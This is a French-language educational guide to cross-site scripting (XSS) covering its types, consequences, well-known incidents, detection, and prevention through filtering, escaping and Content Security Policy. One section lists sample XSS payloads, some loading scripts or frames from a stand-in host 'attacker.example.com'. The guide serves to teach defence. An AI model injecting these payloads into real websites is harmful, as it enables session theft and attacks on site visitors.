# Failles XSS

### **Qu'est-ce que le cross-site scripting ?**

Le cross-site scripting (XSS) est une vulnérabilité web qui permet à un pirate informatique d'introduire (injecter) des commandes indésirables dans le code client légitime (généralement JavaScript) exécuté par un navigateur au nom de l'application web.

**Gravité :** sévère  
**Prévalence :** découverte très souvent  
**Portée :** sites web et applications web  
**Impact technique :** exécution de code malveillant dans le navigateur  
**Conséquences les plus graves :** compromission totale du système  
**Solution rapide :** utilisation de la filtration et de l'encodage des entrées utilisateur

#### **Comment fonctionne le cross-site scripting ?**

La plupart des sites web et des applications web exécutent du code côté client dans le navigateur web en utilisant un langage de script dynamique, souvent JavaScript. Les sites web et applications web purement HTML existent encore, mais ils sont rares, car les scripts côté client améliorent considérablement l'interface utilisateur et les fonctionnalités du site ou de l'application web. Vous pouvez supposer en toute sécurité que plus de 99 % des sites web et des applications web que vous rencontrez incluent du code JavaScript côté client. Cela signifie que les navigateurs doivent être capables d'interpréter tout code JavaScript au nom de l'application web.

La plupart des applications web et des sites web interagissent également avec les utilisateurs d'une manière ou d'une autre, même s'ils n'utilisent pas JavaScript. L'interaction nécessite une forme d'entrée utilisateur. Par exemple, l'utilisateur peut avoir besoin de taper son nom d'utilisateur pour se connecter à l'application web, et l'application peut afficher ce nom d'utilisateur plus tard dans l'interface utilisateur. Cela signifie que l'application traite les entrées utilisateur puis les renvoie dans le navigateur web.

Ces deux conditions combinées posent les bases de la vulnérabilité de sécurité web la plus courante : le cross-site scripting, un type d'attaque par injection. Si un attaquant peut inclure du code JavaScript dans un paramètre d'entrée utilisateur et que l'application renvoie directement ce code dans sa sortie HTML et l'envoie au navigateur client, le navigateur exécutera le JavaScript malveillant. Chaque fois qu'une page web renvoie directement les entrées utilisateur, les attaquants peuvent exécuter des scripts malveillants dans le navigateur client, même si la page elle-même est construite uniquement avec des balises HTML statiques et n'inclut aucun JavaScript.

Contrairement à la plupart des autres vulnérabilités des applications web, celle-ci n'affecte pas directement l'arrière-plan de l'application (le serveur web). Elle affecte les utilisateurs réguliers de l'application web ou les victimes qui sont trompées pour y accéder. Le XSS est également possible pour certaines API qui autorisent JavaScript ; par exemple, une API peut présenter à l'utilisateur un message d'erreur contenant du JavaScript préalablement injecté par un attaquant.

Pendant de nombreuses années, le cross-site scripting avait sa propre catégorie séparée dans le Top 10 OWASP. Cependant, en 2021, les créateurs de la liste ont décidé de l'incorporer dans la catégorie Injection, aux côtés de l'injection SQL, du RCE, et bien d'autres.

#### **Types de vulnérabilités cross-site scripting**

Il existe 2 techniques de cross-site scripting très courantes :

- XSS réfléchi (non persistant)
- XSS stocké (persistant)

De plus, il existe 2 autres techniques de cross-site scripting rencontrées moins fréquemment :

- XSS basé sur le DOM
- XSS stocké aveugle

Ces quatre types d'attaques XSS sont décrits dans des chapitres séparés.

#### **Vecteurs d'attaque XSS**

Les éléments de langage JavaScript couramment utilisés dans les charges utiles malveillantes pour réaliser des attaques de cross-site scripting comprennent :

```html
// la balise script
<script src=http://attacker.example.com/xss.js></script> <script> alert("XSS");</script>

// Les attributs `onload` et `onerror`
<img src=x onerror=alert("XSS")>
<body onload=alert("XSS")>

// Les attributs de la balise `<body>`
<body background="javascript:alert('XSS')">

// Les attributs de la balise `<img>`
<img src="javascript:alert('XSS');">
<img dynsrc="javascript:alert('XSS')">
<img lowsrc="javascript:alert('XSS')">

// La balise `<iframe>`
<iframe src="http://attacker.example.com/xss.html">

// Les attributs de la balise `<input>`
<input type="image" src="javascript:alert('XSS');">

// La balise `<link>`
<link rel="stylesheet" href="javascript:alert('XSS');">

// Les attributs des balises `<table>` et `<td>`
<table background="javascript:alert('XSS')">
<td background="javascript:alert('XSS')">

// Les attributs de la balise `<div>`
<div style="background-image: url(https:// example. com('XSS'))">
<div style="width: "expression(alert('XSS'));">

// La balise `<object>`
<object type="text/x-scriptlet" data="http://attacker.example.com/xss.html">
```

#### **Conséquences potentielles d'une attaque de cross-site scripting**

Le cross-site scripting est souvent sous-estimé. Bien que la vulnérabilité n'affecte pas directement le serveur web ou la base de données, elle peut très facilement entraîner des conséquences graves telles que les suivantes :

- L'attaquant peut tromper un utilisateur légitime pour qu'il fournisse ses identifiants de connexion. Si cet utilisateur a des privilèges administratifs, l'attaquant obtiendra un accès administratif à l'application web. L'attaquant peut également voler les cookies de session de l'utilisateur et les utiliser pour se connecter en tant que victime pour effectuer un détournement de session. Un tel vol de jetons de session peut entraîner de graves conséquences, y compris l'obtention par l'attaquant d'un contrôle total sur l'application web (si le cookie de l'utilisateur appartient à un administrateur) et l'escalade de l'attaque.

- L'attaquant peut introduire du JavaScript malveillant dans vos pages régulières, attaquant chaque utilisateur qui visite cette page. Cela peut entraîner l'exposition d'informations sensibles que les utilisateurs envoient à votre page ou récupèrent de vos bases de données.

- L'attaquant peut utiliser un site vulnérable aux attaques XSS réfléchies comme un outil pour mener une campagne de phishing. Des millions d'emails peuvent inclure un lien menant à votre application web - et chaque fois qu'une victime visite ce lien, le navigateur de la victime exécutera du contenu malveillant fourni par l'attaquant. Cela peut avoir un impact énorme sur la réputation de votre entreprise.

- L'attaquant peut également utiliser le cross-site scripting pour télécharger des logiciels malveillants sur l'ordinateur de l'utilisateur, par exemple un script de minage de cryptomonnaie, un script de botnet DDoS, ou même un cheval de Troie ou un installeur de ransomware. Si cela arrive à un utilisateur avec des privilèges administratifs sur des actifs de l'entreprise, cela pourrait même permettre à l'attaquant d'obtenir un accès complet aux systèmes internes.

Alors que la plupart des autres attaques web ciblent le côté serveur, le cross-site scripting est différent en ce que les attaques XSS utilisent votre site web ou votre application web comme un outil pour attaquer directement les utilisateurs - soit vos utilisateurs professionnels soit des étrangers complets. Comme ce sont les utilisateurs qui subissent d'abord les conséquences, l'impact commercial du XSS sur le propriétaire de l'application est souvent indirect et donc sous-estimé.

#### **Exemples de vulnérabilités cross-site scripting connues**

- **Le ver Samy de 2005** - En octobre 2005, Samy Kamkar, un utilisateur de la plateforme de médias sociaux MySpace, a créé une expérience censée être une farce amusante mais qui s'est transformée en cauchemar. Il a inclus du code JavaScript dans le contenu d'un message sur le tableau de bord de MySpace. Lorsque la page de Samy était visitée par quelqu'un, ce code était exécuté par le navigateur de l'utilisateur et postait le même commentaire sur le profil de la victime. En 20 heures, le ver XSS avait atteint plus d'un million d'utilisateurs MySpace. Pour sa farce, Kamkar a été perquisitionné en 2006 par les services secrets américains et a conclu un accord de plaidoyer - trois ans de probation sans accès à Internet.

- **En 2011**, des attaquants ont utilisé une vulnérabilité XSS de Facebook pour lancer un ver de spam auto-propagé similaire au ver Samy original. La vulnérabilité se trouvait dans l'API mobile de Facebook. Les attaquants ont créé une page web avec un élément iframe spécialement conçu qui obligeait tous les utilisateurs de Facebook visitant la page à poster des messages non autorisés sur leurs murs, incitant davantage d'utilisateurs à visiter la même page. Ce fut l'une des nombreuses vulnérabilités XSS sur les sites de médias sociaux, et d'autres continuent d'apparaître encore aujourd'hui.

- **La violation de British Airways en 2018** - C'est probablement la violation XSS la plus célèbre à ce jour, ayant conduit au vol de données sensibles. Les attaquants, soupçonnés de faire partie de l'organisation Magecart, ont utilisé une vulnérabilité XSS pour récolter des informations personnelles et de paiement de jusqu'à 380 000 clients de British Airways. Bien que ce ne soit pas une attaque XSS stockée classique, les attaquants ont réussi à placer des scripts malveillants sur les sites de paiement de British Airways qui envoyaient des informations sensibles à un serveur sous le contrôle des attaquants. Des attaques Magecart similaires ont eu lieu avant et continuent d'avoir lieu, mais l'étendue de l'attaque est généralement plus limitée.

#### **Comment détecter les vulnérabilités de cross-site scripting ?**

La meilleure façon de détecter les vulnérabilités XSS varie en fonction de leur nature, connue ou inconnue.

- Si vous n'utilisez que des applications web commerciales ou open-source et ne développez pas d'applications web vous-même, il peut suffire d'identifier la version exacte de l'application que vous utilisez. Si la version identifiée est sensible au XSS, vous pouvez supposer que votre site web est vulnérable. Vous pouvez identifier la version manuellement ou utiliser un outil de sécurité approprié, comme une solution d'analyse de composition logicielle (SCA).

- Si vous développez vos propres applications web ou souhaitez potentiellement trouver des vulnérabilités XSS inconnues (zero-days) dans des applications connues, vous devez être capable d'exploiter avec succès la vulnérabilité XSS pour être certain de son existence. Cela nécessite soit de réaliser des tests de pénétration manuels avec l'aide de chercheurs en sécurité, soit d'utiliser un outil de test de sécurité (scanner) capable d'utiliser l'automatisation pour exploiter les vulnérabilités web. Des exemples de tels outils sont Invicti et Acunetix par Invicti.

Nous recommandons d'utiliser cette méthode même pour les vulnérabilités connues.

#### **Comment prévenir les vulnérabilités de cross-site scripting dans les applications web ?**

L'une des raisons pour lesquelles le cross-site scripting est si courant est qu'il est difficile de s'en protéger, plus difficile que la plupart des autres vulnérabilités web. Bien que vous puissiez prévenir la plupart des autres vulnérabilités, par exemple en évitant des constructions linguistiques spécifiques, la seule façon sûre de prévenir le XSS dans votre application serait d'éviter complètement d'utiliser les données d'entrée utilisateur dans le code côté client. Malheureusement, cela handicaperait la fonctionnalité principale de la plupart des applications.

Par conséquent, la meilleure façon d'éviter les vulnérabilités de cross-site scripting est de valider et de désinfecter les entrées utilisateur. Il existe deux techniques principales que vous pouvez utiliser pour désinfecter les données provenant de l'utilisateur : le filtrage et l'échappement.

#### **Filtrage pour le XSS**

La façon la plus simple d'éliminer les vulnérabilités XSS est de faire passer toutes les données externes par un filtre. Un tel filtre supprime les mots-clés dangereux, par exemple la balise `<script>`, les commandes JavaScript, les styles CSS et d'autres éléments HTML dangereux, tels que les gestionnaires d'événements. Dans certains cas, un filtre pourrait même éliminer tous les caractères spéciaux. Par exemple, un simple filtre peut trouver et supprimer tous les caractères autres que les lettres et les chiffres dans des requêtes HTTP spécifiques. Lorsqu'elles sont filtrées de cette manière, `<script>alert("XSS");</script>` ferait simplement son chemin jusqu'à la réponse HTTP en tant que scriptalertXSSscript inoffensif.

Malheureusement, le filtrage peut avoir des effets secondaires. Les filtres suppriment souvent du contenu légitime car il correspond à des mots-clés interdits. C'est pourquoi le filtrage n'est recommandé que si le contenu est très simple. Si le contenu est complexe et, par exemple, doit inclure du code HTML, vous devriez plutôt utiliser l'échappement.

Certains développeurs web choisissent de mettre en œuvre leurs propres filtres, généralement en utilisant des expressions régulières. Cela n'est pas recommandé, car les pirates peuvent contourner de tels filtres simples en utilisant de nombreuses astuces, telles que l'encodage hexadécimal des caractères spéciaux, l'utilisation de variations de caractères Unicode ou l'introduction de sauts de ligne et de caractères nuls dans les chaînes. La liste des méthodes d'évasion du XSS est énorme, il est donc préférable de vous diriger vers un post dédié à ce sujet.

Vos filtres personnalisés devraient prendre en compte toutes ces évasions, les rendant très compliqués et presque impossibles à maintenir. C'est pourquoi la plupart des développeurs préfèrent utiliser des bibliothèques maintenues par la communauté pour la prévention du XSS, qui utilisent des techniques de filtrage et d'encodage. Une telle approche est beaucoup plus efficace, mais, évidemment, elle n'est possible que pour les langages de développement où de telles bibliothèques existent.

#### **Échappement du XSS**

Lorsque vous échappez au XSS (encodez les données), vous indiquez effectivement au navigateur web que le contenu que vous envoyez doit être traité uniquement comme des données et ne doit pas être interprété de toute autre manière. Si un attaquant envoie un script malveillant à votre application web, le navigateur n'exécutera pas le script encodé mais peut afficher le code malveillant comme texte régulier à l'écran.

Le problème avec l'échappement est que vous devez utiliser différentes techniques d'échappement dans différentes situations. Tout dépend de l'endroit où vous traitez les données utilisateur sur la page web. En pratique, vous devez savoir comment et quand échapper au moins HTML, code JavaScript, CSS et URL :

- Utilisez l'échappement HTML lorsque vous utilisez des données non fiables entre les balises HTML ouvrantes et fermantes. Par exemple, `<td>&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;</td>`.
- Utilisez l'échappement JavaScript lorsque vous utilisez des données non fiables dans l'un de vos propres scripts ou dans des endroits où il est possible d'inclure du JavaScript, comme les gestionnaires d'événements (onload, onmouseover, etc.). Par exemple, `<body onload="\x3Cscript\x3Ealert\x28\x22XSS\x22\x29\x3B\x3C\x2Fscript\x3E">`
- Utilisez l'échappement CSS lorsque vous utilisez des données non fiables dans les styles CSS. Par exemple, `<div style="background-image: \x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3B\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E">`
- Utilisez l'encodage URL lorsque vous utilisez des données non fiables dans une URL. Par exemple, `<a href="http://www.example.com/%3Cscript%3Ealert%28%22xss%22%29%3B%3C%2Fscript%3E">`.

Tout comme pour les filtres personnalisés, écrire de telles routines d'échappement par vous-même est extrêmement chronophage et rend le code difficile à maintenir. C'est pourquoi la plupart des développeurs web utilisent des bibliothèques pour gérer à la fois le filtrage et l'échappement pour la prévention du XSS. Cependant, même si vous utilisez une bibliothèque tierce, vous devez savoir quels mécanismes utiliser dans quelles parties de votre code source.

#### **Bibliothèques utiles**

Si vous écrivez du code pour les technologies Microsoft, vous avez de la chance. Microsoft fournit une bibliothèque complète qui répondra à tous vos besoins - AntiXSS. Cette bibliothèque est constamment mise à jour et bien entretenue, donc aucun autre outil n'est nécessaire.

Veuillez noter que la prévention des attaques XSS est très complexe, donc ce qui précède n'est qu'une liste simplifiée. Pour un guide complet et détaillé, consultez la feuille de triche OWASP.

#### **Comment atténuer les attaques de script intersite (XSS) ?**

Pour rendre la plupart des attaques XSS impossibles à exécuter, utilisez une Politique de Sécurité du Contenu (CSP) sur votre serveur web. Des en-têtes CSP bien choisis rendent impossible pour l'attaquant d'inclure des ressources provenant de l'extérieur de l'application web et de communiquer avec des sites externes. Cela rend la plupart des attaques XSS inoffensives - bien que l'attaquant puisse amener le navigateur à exécuter du JavaScript tel que la balise "script" elle-même, ce code ne pourra pas envoyer d'informations à l'attaquant ni télécharger quoi que ce soit depuis des sites contrôlés par l'attaquant.

Pour une atténuation temporaire, vous pouvez compter sur les règles de pare-feu d'application web (WAF). Avec de telles règles, les utilisateurs ne pourront pas fournir d'entrées malveillantes à votre application web, donc aucun code malveillant ne s'exécutera dans leurs navigateurs. Cependant, étant donné que les pare-feu d'application web ne comprennent pas le contexte de votre application, ces règles peuvent être contournées par les attaquants et ne doivent jamais être considérées comme une solution permanente.

Notez que vous ne devez pas compter sur les filtres XSS intégrés qui viennent avec de nombreux navigateurs. Initialement conçus pour prévenir les attaques XSS, ces filtres intégrés se sont révélés inefficaces et faciles à contourner pour les attaquants. Ils ont également créé un faux sentiment de sécurité et ont dissuadé les développeurs de faire l'effort supplémentaire nécessaire pour éliminer les vulnérabilités de script intersite de leur code. En conséquence, de nombreux fournisseurs de navigateurs ont déjà supprimé de tels filtres côté client de leurs produits.
